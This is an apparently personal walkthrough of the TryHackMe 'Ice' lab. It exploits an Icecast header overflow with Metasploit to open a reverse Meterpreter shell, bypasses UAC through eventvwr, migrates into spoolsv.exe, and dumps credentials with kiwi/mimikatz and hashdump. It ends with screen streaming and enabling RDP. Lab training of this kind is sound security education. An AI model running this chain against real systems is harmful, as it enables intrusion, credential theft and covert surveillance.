# Tryhackme: Ice Challeng Walkthrough

Room URL: https://tryhackme.com/room/ice 
# Recon


```bash
sudo nmap -sS -sV -n -F 10.10.37.29                             
Nmap scan report for 10.10.37.29
Host is up (2.1s latency).
Not shown: 91 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open  http         Icecast streaming media server
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.39 seconds

```
- **MSRPC** is the protocol standard for Windows processes that allows a program running on one host to execute a program on another host.
- **NetBIOS** (Network Basic Input/Output System) is a protocol used for communication within a local network. 
- **Microsoft-DS**, short for Microsoft Directory Service, is a network service that uses port 445 to facilitate file and printer sharing in Windows environments
- [Icecast](https://icecast.org/) is a free and open-source streaming media server which supports various streaming formats, including MP3. It's widely used for setting up online radio stations and creating or distributing online audio content

# Gain Access

[iceexec-adv.txt](http://aluigi.altervista.org/adv/iceexec-adv.txt): The Icecast server accepts a maximum of 32 headers in the clients HTTP
request.

In some environments (like in Win32) a request with more than 31
headers causes the overwriting of the return address of the vulnerable
function with a pointer to the beginning of the 32th header.

In short, is possible to execute remote code simply using the normal
HTTP request plus 31 headers followed by a shellcode that will be
executed directly without the need of calling/jumping to registers or
addresses or using other annoying techniques.

We will use the Metasploit Framework, start it using `msfconsole`
```bash
msf6 > search icecast

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite
msf6 > use exploit/windows/http/icecast_header
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

Set the required options: Remote host and local host
```bash
msf6 exploit(windows/http/icecast_header) > set RHOST 10.10.37.29
RHOST => 10.10.37.29
msf6 exploit(windows/http/icecast_header) > set LHOST 10.9.8.180
msf6 exploit(windows/http/icecast_header) > options

Module options (exploit/windows/http/icecast_header):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.10.37.29      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploi
                                      t/basics/using-metasploit.html
   RPORT   8000             yes       The target port (TCP)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.9.8.180        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.
```

Then start the exploitation
```bash
msf6 exploit(windows/http/icecast_header) > exploit
[*] Started reverse TCP handler on 10.9.8.180:4444 
[*] Sending stage (177734 bytes) to 10.10.37.29
[*] Meterpreter session 1 opened (10.9.8.180:4444 -> 10.10.37.29:49245) at 2025-07-19 06:21:12 -0400
meterpreter >
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

```
We have successfully gained access to the target machine! Use the `help` or `?` command to show you the help menu 

# Escalate

Now that we have gained access, let's start the enumeration
```bash
meterpreter > sysinfo
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > pwd
C:\Program Files (x86)\Icecast2 Win32
meterpreter > ls
Listing: C:\Program Files (x86)\Icecast2 Win32
==============================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100777/rwxrwxrwx  512000  fil   2004-01-08 09:26:45 -0500  Icecast2.exe
040777/rwxrwxrwx  4096    dir   2019-11-12 18:04:09 -0500  admin
040777/rwxrwxrwx  0       dir   2019-11-12 18:04:09 -0500  doc
100666/rw-rw-rw-  3663    fil   2004-01-08 09:25:30 -0500  icecast.xml
100777/rwxrwxrwx  253952  fil   2004-01-08 09:27:09 -0500  icecast2console.exe
100666/rw-rw-rw-  872448  fil   2002-06-27 21:11:54 -0400  iconv.dll
100666/rw-rw-rw-  188477  fil   2003-04-12 23:29:12 -0400  libcurl.dll
100666/rw-rw-rw-  631296  fil   2002-07-10 22:09:00 -0400  libxml2.dll
100666/rw-rw-rw-  128000  fil   2002-07-10 22:11:54 -0400  libxslt.dll
040777/rwxrwxrwx  0       dir   2019-11-12 18:26:02 -0500  logs
100666/rw-rw-rw-  53299   fil   2002-03-23 09:48:14 -0500  pthreadVSE.dll
100666/rw-rw-rw-  2380    fil   2019-11-12 18:04:09 -0500  unins000.dat
100777/rwxrwxrwx  71588   fil   2003-04-14 04:00:00 -0400  unins000.exe
040777/rwxrwxrwx  0       dir   2019-11-12 18:04:09 -0500  web
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User          Path
 ---   ----  ----               ----  -------  ----          ----
 0     0     [System Process]
 4     0     System
 416   4     smss.exe
 544   536   csrss.exe
 592   536   wininit.exe
 604   584   csrss.exe
 652   584   winlogon.exe
 680   692   svchost.exe
 692   592   services.exe
 700   592   lsass.exe
 708   592   lsm.exe
 816   692   svchost.exe
 880   1524  Icecast2.exe       x86   1        Dark-PC\Dark  C:\Program Files (x86)\Icecast2 Win32\Icecast2.ex
                                                             e
 884   692   svchost.exe
 932   692   svchost.exe
 1020  692   svchost.exe
 1060  692   svchost.exe
 1140  692   svchost.exe
 1264  692   spoolsv.exe
 1328  692   svchost.exe
 1432  692   taskhost.exe       x64   1        Dark-PC\Dark  C:\Windows\System32\taskhost.exe
 1444  692   amazon-ssm-agent.
             exe
 1508  1020  dwm.exe            x64   1        Dark-PC\Dark  C:\Windows\System32\dwm.exe
 1524  1500  explorer.exe       x64   1        Dark-PC\Dark  C:\Windows\explorer.exe
 1544  692   SearchIndexer.exe
 1740  692   LiteAgent.exe
 1792  692   svchost.exe
 2008  692   Ec2Config.exe
 2080  692   vds.exe
 2084  816   WmiPrvSE.exe
 2468  692   svchost.exe
 2660  692   TrustedInstaller.
             exe
 2808  692   sppsvc.exe
 2928  816   slui.exe           x64   1        Dark-PC\Dark  C:\Windows\System32\slui.exe

meterpreter > 
```

we will use the Metasploit module `post/multi/recon/local_exploit_suggester` which is a post-exploitation module used to suggest local privilege escalation exploits on a compromised system.
- Gathers information about the target system (e.g., kernel version, architecture).
- Compares it with Metasploit's known local exploits.
- Suggests the most likely working local privilege escalation exploits.

<img width="1459" height="796" alt="image" src="https://github.com/user-attachments/assets/e4b4f99b-f0d1-41db-96a4-5900a1d7ab69" />

The Metasploit module `exploit/windows/local/bypassuac_eventvwr` is a local privilege escalation exploit that targets Windows UAC (User Account Control) using a method involving the Event Viewer

Background our current session using the command `background` or `CTRL + z`
```bash
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/http/icecast_header) > sessions

Active sessions
===============

  Id  Name  Type                     Information             Connection
  --  ----  ----                     -----------             ----------
  1         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.9.8.180:4444 -> 10.10.37.29:49245 (10.10.37.29)

```

Use the exploit module, and set the required options
```bash
msf6 exploit(windows/http/icecast_header) > use exploit/windows/local/bypassuac_eventvwr
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/bypassuac_eventvwr) > show options 

Module options (exploit/windows/local/bypassuac_eventvwr):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86



View the full module info with the info, or info -d command.
```

set the local host and the session number that our target is running on
```bash
msf6 exploit(windows/local/bypassuac_eventvwr) > set session 1
session => 1
msf6 exploit(windows/local/bypassuac_eventvwr) > set LHOST 10.9.8.180
LHOST => 10.9.8.180
msf6 exploit(windows/local/bypassuac_eventvwr) > show options

Module options (exploit/windows/local/bypassuac_eventvwr):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.9.8.180       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86



View the full module info with the info, or info -d command.

```

Now run the exploit
```bash
msf6 exploit(windows/local/bypassuac_eventvwr) > run
[*] Started reverse TCP handler on 10.9.8.180:4444 
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
[*] Sending stage (177734 bytes) to 10.10.37.29
[*] Cleaning up registry keys ...
[*] Meterpreter session 2 opened (10.9.8.180:4444 -> 10.10.37.29:49280) at 2025-07-19 06:54:10 -0400

meterpreter > background
msf6 exploit(windows/local/bypassuac_eventvwr) > sessions 

Active sessions
===============

  Id  Name  Type                     Information             Connection
  --  ----  ----                     -----------             ----------
  1         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.9.8.180:4444 -> 10.10.37.29:49245 (10.10.37.29)
  2         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.9.8.180:4444 -> 10.10.37.29:49280 (10.10.37.29)

msf6 exploit(windows/local/bypassuac_eventvwr) > sessions 2
[*] Starting interaction with 2...

meterpreter > 
```

To verify that we have expanded permissions, use the command `getprivs`
```bash
meterpreter > ?
Stdapi: System Commands
=======================

    Command                   Description
    -------                   -----------
    clearev                   Clear the event log
    drop_token                Relinquishes any active impersonation token.
    execute                   Execute a command
    getenv                    Get one or more environment variable values
    getpid                    Get the current process identifier
    getprivs                  Attempt to enable all privileges available to the current process
    getsid                    Get the SID of the user that the server is running as
    getuid                    Get the user that the server is running as
    kill                      Terminate a process
    localtime                 Displays the target system local date and time
    pgrep                     Filter processes by name
    pkill                     Terminate processes by name
    ps                        List running processes
    reboot                    Reboots the remote computer
    reg                       Modify and interact with the remote registry
    rev2self                  Calls RevertToSelf() on the remote machine
    shell                     Drop into a system command shell
    shutdown                  Shuts down the remote computer
    steal_token               Attempts to steal an impersonation token from the target process
    suspend                   Suspends or resumes a list of processes
    sysinfo                   Gets information about the remote system, such as OS

meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

The permission `SeTakeOwnershipPrivilege` allows us to take ownership of files

# Looting


Gather additional credentials and crack the saved hashes on the machine.

The service that is responsible for Windows authentication is `lsass.exe`; we need to interact with this process. List all the processes using `ps` command

<img width="1555" height="802" alt="image" src="https://github.com/user-attachments/assets/e85d9ced-23f8-4da5-9e99-ef61b061fe7d" />


```bash
meterpreter > getpid
Current pid: 1628
meterpreter > getuid
Server username: Dark-PC\Dark
```
The current process we are running is:
```bash
PID   PPID  Name            Arch  Session  User          Path
 ---   ----  ----            ----  -------  ----          ----
 1628  2936  powershell.exe  x86   1        Dark-PC\Dark  C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe

```

Our target process is:
```bash
 PID  PPID  Name       Arch  Session  User                 Path
 ---  ----  ----       ----  -------  ----                 ----
 700  592   lsass.exe  x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\lsass.exe
```

> Note: if you get a timeout error, use this command to set the timeout to last for 30 seconds
```bash
sessions --interact <id> --timeout 30
```

Even though hwe ave SYSTEM-level access and a lot of powerful privileges, including:

- SeDebugPrivilege — lets a process debug (and access memory of) other processes.
- SeImpersonatePrivilege — used for token stealing.
- SeLoadDriverPrivilege — lets you load unsigned drivers (which can defeat protections).
- SeTakeOwnershipPrivilege — can let you take control of system objects.

We can't interact with `lsass.exe` process, and the reason for that is: 
- We're in `SysWOW64\powershell.exe`, which is 32-bit
- `lsass.exe` is 64-bit
- A 32-bit process cannot access the memory of a 64-bit process, even with `SeDebugPrivilege`

So, to interact with LSASS, we need to be “living in” a process that is the same architecture as the LSASS service (`x64` in the case of this machine) and a process that has the same permissions as LSASS. 

This is achived using **DLL injection**:
- Pick a legitimate process (e.g., `spoolsv.exe`)
- Inject a malicious DLL into that process, 
- Then DLL starts a new thread — this thread is your reverse shell, Meterpreter, or payload. 
- Now your shell "lives inside" that process

Use `migrate -N <process name>` to migrate to a process that has the same arc and permissions as the `lsass.exe` process. 
```bash
meterpreter > migrate -N spoolsv.exe
[*] Migrating from 2712 to 1368...
[*] Migration completed successfully.
meterpreter > 
meterpreter > getpid
Current pid: 1368
meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```
> Note: I get disconnected from the target machine, that's why the pid of 2712 is different from earlier. 

Now we are successfully migrated to the spooler process.
```bash
1368  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
```

Start the looting process using Mimikatz tool. (Kiwi is the updated version of Mimikatz)
```bash
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > help kiwi

Kiwi Commands
=============

    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    creds_livessp          Retrieve Live SSP creds
    creds_msv              Retrieve LM/NTLM creds (parsed)
    creds_ssp              Retrieve SSP creds
    creds_tspkg            Retrieve TsPkg creds (parsed)
    creds_wdigest          Retrieve WDigest creds (parsed)
    dcsync                 Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create   Create a golden kerberos ticket
    kerberos_ticket_list   List all kerberos tickets (unparsed)
    kerberos_ticket_purge  Purge any in-use kerberos tickets
    kerberos_ticket_use    Use a kerberos ticket
    kiwi_cmd               Execute an arbitrary mimikatz command (unparsed)
    lsa_dump_sam           Dump LSA SAM (unparsed)
    lsa_dump_secrets       Dump LSA secrets (unparsed)
    password_change        Change the password/hash of a user
    wifi_list              List wifi profiles/creds for the current user
    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)


meterpreter > 
```
Loading kiwi into our meterpreter session will expand our help menu. To retrieve all the credentials, use this command

```bash
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username  Domain   LM                                NTLM                              SHA1
--------  ------   --                                ----                              ----
Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb

wdigest credentials
===================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
DARK-PC$  WORKGROUP  (null)
Dark      Dark-PC    Password01!

tspkg credentials
=================

Username  Domain   Password
--------  ------   --------
Dark      Dark-PC  Password01!

kerberos credentials
====================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
Dark      Dark-PC    Password01!
dark-pc$  WORKGROUP  (null)
```

# Post-Exploitation

Use `hashdump` command to dump all of the password hashes stored on the system.
```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Dark:1000:aad3b435b51404eeaad3b435b51404ee:7c4fe5eada682714a036e39378362bab:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
meterpreter > 
```
Use `screenshare` command to allow us to watch the remote user's desktop in real time
```bash
meterpreter > screenshare
[*] Preparing player...
[*] Opening player at: /home/kali/eZcsKSBO.html
[*] Streaming...
```
<img width="912" height="257" alt="image" src="https://github.com/user-attachments/assets/885bba41-0b80-4a15-a2f6-c4a74cd2b93b" />

- Use `record_mic` command if we want to record from a microphone attached to the system
- Use `timestomp` to modify the timestamps of files on the system
- Use `golden_ticket_create` of the Kiwi's commands allow us to create a golden ticket to maintain persistence and authenticate as any user on the domain.

One last thing to note. As we have the password for the user 'Dark', we can now authenticate to the machine and access it via remote desktop (MSRDP)
```bash
meterpreter > run post/windows/manage/enable_rdp
[*] Enabling Remote Desktop
[*]     RDP is already enabled
[*] Setting Terminal Services service startup mode
[*]     The Terminal Services service is not set to auto, changing it to auto ...
[*]     Opening port in local firewall if necessary
meterpreter > 
```
